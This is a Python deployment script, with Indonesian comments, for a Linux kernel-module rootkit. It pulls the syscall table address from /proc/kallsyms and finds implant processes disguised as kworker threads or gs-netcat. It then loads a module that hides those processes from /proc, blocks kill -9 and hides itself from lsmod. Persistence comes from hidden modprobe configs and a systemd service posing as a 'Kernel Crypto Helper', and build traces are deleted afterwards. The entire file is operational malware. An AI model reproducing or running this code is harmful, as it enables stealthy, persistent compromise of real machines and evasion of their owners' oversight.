#!/usr/bin/env python3
"""
kmod_deploy.py — Deploy kernel module rootkit
Fix: baca syscall_table address dari /proc/kallsyms
     pass ke module sebagai parameter — tidak ada kprobe scan yang bisa hang
"""

import os
import sys
import subprocess
import time
import shutil

KMOD_SRC = "gsock_protect.c"
KMOD_OUT = "gsock_protect.ko"

# ─── HELPERS ──────────────────────────────────────────────────────────────────

def run(cmd, capture=True):
    r = subprocess.run(cmd, shell=True, capture_output=capture, text=True)
    stdout = (r.stdout or "").strip()
    stderr = (r.stderr or "").strip()
    return r.returncode, stdout, stderr

def run_live(cmd):
    return subprocess.call(cmd, shell=True)

def ok(m):   print(f"\033[92m[+] {m}\033[0m")
def info(m): print(f"\033[94m[*] {m}\033[0m")
def err(m):  print(f"\033[91m[-] {m}\033[0m")
def warn(m): print(f"\033[93m[!] {m}\033[0m")

# ─── BACA SYSCALL TABLE ADDR DARI /proc/kallsyms ─────────────────────────────

def get_syscall_table_addr():
    """
    Baca address sys_call_table langsung dari /proc/kallsyms.
    Butuh root — non-root hanya lihat 0000000000000000.
    """
    targets = ["sys_call_table", "ia32_sys_call_table"]

    try:
        with open("/proc/kallsyms", "r") as f:
            for line in f:
                parts = line.strip().split()
                if len(parts) >= 3 and parts[2] in targets:
                    addr = int(parts[0], 16)
                    if addr != 0:
                        info(f"Found {parts[2]} at 0x{addr:x}")
                        return addr
    except Exception as e:
        err(f"Cannot read /proc/kallsyms: {e}")

    return 0

# ─── GET IMPLANT PIDS ─────────────────────────────────────────────────────────

def get_implant_pids():
    pids = []
    for pat in ["kworker/2:1H", "kworker/0:0H", "kworker/1:1H", "gs-netcat"]:
        rc, out, _ = run(f"pgrep -f '{pat}' 2>/dev/null")
        if rc == 0 and out:
            pids += [p for p in out.split() if p.isdigit()]
    return list(set(pids))

# ─── CEK HEADERS ──────────────────────────────────────────────────────────────

def check_headers():
    kver = os.uname().release
    kdir = f"/lib/modules/{kver}/build"
    if not os.path.exists(kdir):
        err(f"Kernel headers tidak ada: {kdir}")
        info(f"Jalankan: apt-get install -y linux-headers-{kver}")
        return False
    return True

# ─── COMPILE ──────────────────────────────────────────────────────────────────

def compile_module():
    info("Compiling kernel module...")
    rc, out, err_msg = run("make 2>&1")
    if rc != 0:
        err(f"Compile failed:\n{err_msg or out}")
        return False
    if not os.path.exists(KMOD_OUT):
        err("gsock_protect.ko tidak ditemukan setelah compile")
        return False
    ok(f"Module compiled: {KMOD_OUT}")
    return True

# ─── LOAD MODULE ─────────────────────────────────────────────────────────────

def load_module(pids, sct_addr):
    if not sct_addr:
        err("syscall_table_addr = 0, tidak bisa load module")
        err("Pastikan script dijalankan sebagai root")
        return False

    params = [f"syscall_table_addr={sct_addr}"]
    if pids:
        params.append(f"protected_pids={','.join(pids)}")
        info(f"Protecting PIDs: {pids}")

    param_str = " ".join(params)
    cmd = f"insmod {KMOD_OUT} {param_str}"
    info(f"Loading: {cmd}")

    rc, out, err_msg = run(cmd)

    if rc != 0:
        err(f"insmod failed: {err_msg or out}")
        info("dmesg:")
        run_live("dmesg | tail -10")
        return False

    ok("Kernel module loaded!")

    rc2, _, _ = run("lsmod | grep gsock_protect")
    if rc2 != 0:
        ok("Module tersembunyi dari lsmod (self-hide aktif)")
    else:
        warn("Module masih terlihat di lsmod")

    return True

# ─── INSTALL AUTOLOAD ─────────────────────────────────────────────────────────

def install_autoload(pids, sct_addr):
    info("Installing autoload on boot...")
    kver    = os.uname().release
    kdir    = f"/lib/modules/{kver}/kernel/drivers/misc"
    ko_dest = f"{kdir}/.gsock.ko"

    os.makedirs(kdir, exist_ok=True)
    try:
        shutil.copy(KMOD_OUT, ko_dest)
        ok(f"Module copied to {ko_dest}")
    except Exception as e:
        warn(f"Copy failed: {e}")

    pid_str = ",".join(pids) if pids else "0"

    try:
        with open("/etc/modprobe.d/.gsock.conf", "w") as f:
            f.write(
                f"options gsock_protect "
                f"syscall_table_addr={sct_addr} "
                f"protected_pids={pid_str}\n"
            )
        ok("modprobe config installed")
    except Exception as e:
        warn(f"modprobe config failed: {e}")

    try:
        with open("/etc/modules-load.d/.gsock.conf", "w") as f:
            f.write("gsock_protect\n")
        ok("modules-load config installed")
    except Exception as e:
        warn(f"modules-load failed: {e}")

    run("depmod -a 2>/dev/null")

    # Systemd service — re-read addr saat boot
    service = f"""[Unit]
Description=Kernel Crypto Helper
DefaultDependencies=no
Before=sysinit.target

[Service]
Type=oneshot
ExecStartPre=/bin/sh -c 'echo $(grep -w sys_call_table /proc/kallsyms | awk "{{print \\"0x\\"$1}}") > /run/.sct_addr'
ExecStart=/bin/sh -c 'insmod {ko_dest} syscall_table_addr=$(cat /run/.sct_addr) protected_pids={pid_str}'
RemainAfterExit=yes

[Install]
WantedBy=sysinit.target
"""
    try:
        spath = "/etc/systemd/system/.kcrypto-helper.service"
        with open(spath, "w") as f:
            f.write(service)
        run("systemctl enable .kcrypto-helper 2>/dev/null")
        ok("Systemd autoload service installed")
    except Exception as e:
        warn(f"Systemd service failed: {e}")

# ─── TEST ─────────────────────────────────────────────────────────────────────

def test_protection(pids):
    if not pids:
        return
    info("Testing protection...")
    pid = pids[0]

    run(f"kill -9 {pid} 2>/dev/null")
    time.sleep(1)

    rc, _, _ = run(f"kill -0 {pid} 2>/dev/null")
    if rc == 0:
        ok(f"PID {pid} masih hidup setelah kill -9 ✓")
    else:
        warn(f"PID {pid} tidak respond — watchdog akan restart")

    if not os.path.exists(f"/proc/{pid}"):
        ok(f"PID {pid} tersembunyi dari /proc ✓")
    else:
        warn(f"PID {pid} masih terlihat di /proc")

# ─── CLEANUP ──────────────────────────────────────────────────────────────────

def cleanup():
    for f in [
        KMOD_OUT, "Module.symvers", "modules.order",
        "gsock_protect.mod.c", "gsock_protect.mod",
        ".gsock_protect.ko.cmd", ".gsock_protect.o.cmd",
        "gsock_protect.o", ".gsock_protect.o.d",
    ]:
        try: os.unlink(f)
        except: pass

# ─── MAIN ─────────────────────────────────────────────────────────────────────

def deploy():
    print("""
╔══════════════════════════════════════════════════╗
║    Kernel Rootkit Module Deployer                ║
╚══════════════════════════════════════════════════╝
""")

    if os.geteuid() != 0:
        err("Butuh root!")
        sys.exit(1)

    # Cek / install headers
    if not check_headers():
        kver = os.uname().release
        info(f"Mencoba install linux-headers-{kver}...")
        run_live(f"apt-get install -y linux-headers-{kver}")
        if not check_headers():
            sys.exit(1)

    # Baca syscall table address
    sct_addr = get_syscall_table_addr()
    if not sct_addr:
        err("Gagal baca syscall_table dari /proc/kallsyms")
        err("Pastikan dijalankan sebagai root")
        sys.exit(1)
    ok(f"syscall_table_addr = 0x{sct_addr:x}")

    pids = get_implant_pids()
    if pids:
        info(f"Implant PIDs: {pids}")
    else:
        warn("Tidak ada implant PID — jalankan loader.py dulu")

    if not compile_module():
        sys.exit(1)

    if not load_module(pids, sct_addr):
        sys.exit(1)

    install_autoload(pids, sct_addr)

    if pids:
        test_protection(pids)

    cleanup()

    print()
    ok("=" * 50)
    ok("Kernel rootkit deployed!")
    ok(f"syscall_table @ 0x{sct_addr:x}")
    ok(f"Protected PIDs: {pids}")
    ok("kill -9 → blocked")
    ok("rm file implant → blocked")
    ok("ls /proc/<pid> → hidden")
    ok("lsmod → module tidak terlihat")
    ok("=" * 50)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "pids":
            print(get_implant_pids())
        elif sys.argv[1] == "addr":
            addr = get_syscall_table_addr()
            print(f"0x{addr:x}" if addr else "not found")
        elif sys.argv[1] == "test":
            test_protection(get_implant_pids())
    else:
        deploy()
